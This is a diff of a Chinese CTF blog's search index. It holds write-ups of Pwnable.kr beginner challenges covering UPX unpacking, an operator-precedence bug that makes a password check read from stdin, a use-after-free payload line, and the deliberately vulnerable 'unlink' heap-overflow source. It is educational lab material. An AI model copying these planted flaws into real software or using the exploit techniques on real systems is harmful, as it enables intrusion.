-<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/2.png" class></strong></p>
-<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
-<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/3.png" class></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
+<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
+<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
+<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
+<p>将flag的值存放到dest中，直接查看flag即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -531,6 +504,34 @@
 
 <p>因为passcode是输入int型，即输入$0x080485e3 = 134514147$。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/10.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mistake</title>
+    <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/1.png" class></strong></p>
+<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/2.png" class></strong></p>
+<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
+<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/3.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -668,6 +669,24 @@
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;\x68\x15\x40\x00\x00\x00\x00\x00&#x27;&quot;</span> &gt; /tmp/<span class="built_in">exp</span>.txt</span><br></pre></td></tr></table></figure>
 
 <p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/12.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unlink</title>
+    <url>/xiaohong404.github.io/2020/10/24/Pwnable_kr/unlink/</url>
+    <content><![CDATA[<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/24/Pwnable_kr/unlink/1.png" alt="image-20201024154417581"></p>
+<h3 id="查看unlink-c源文件"><a href="#查看unlink-c源文件" class="headerlink" title="查看unlink.c源文件"></a>查看unlink.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK=P-&gt;bk;</span><br><span class="line">        FD=P-&gt;fd;</span><br><span class="line">        FD-&gt;bk=BK;</span><br><span class="line">        BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">        OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">        A-&gt;fd = B;</span><br><span class="line">        B-&gt;bk = A;</span><br><span class="line">        B-&gt;fd = C;</span><br><span class="line">        C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">        <span class="comment">// heap overflow!</span></span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// exploit this unlink!</span></span><br><span class="line">        unlink(B);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
         <category>PWN</category>
